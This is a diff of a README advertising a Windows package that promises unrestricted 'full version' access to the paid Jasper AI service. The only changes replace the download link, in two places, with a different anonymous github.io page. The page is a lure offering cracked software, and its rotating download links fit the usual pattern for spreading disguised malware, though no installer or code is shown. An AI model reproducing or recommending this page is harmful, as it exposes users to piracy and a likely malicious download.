@@ -2,7 +2,7 @@
 
 Discover the ultimate tool for Jasper AI enthusiasts, designed to provide full version access and enhanced capabilities. This package allows you to experience Jasper AI's powerful content generation features without limitations, optimized for Windows desktop environments in 2026. Whether you're creating blog posts, marketing copy, or social media content, this tool streamlines your workflow with AI-driven assistance.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -56,6 +56,6 @@ First, verify your internet connection, as some AI functions require online acce
 
 Get the latest version of Jasper AI for Windows:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 This link provides access to the installer file and additional resources. Remember, this tool is designed for personal and professional use to enhance your content creation process with AI technology in 2026.
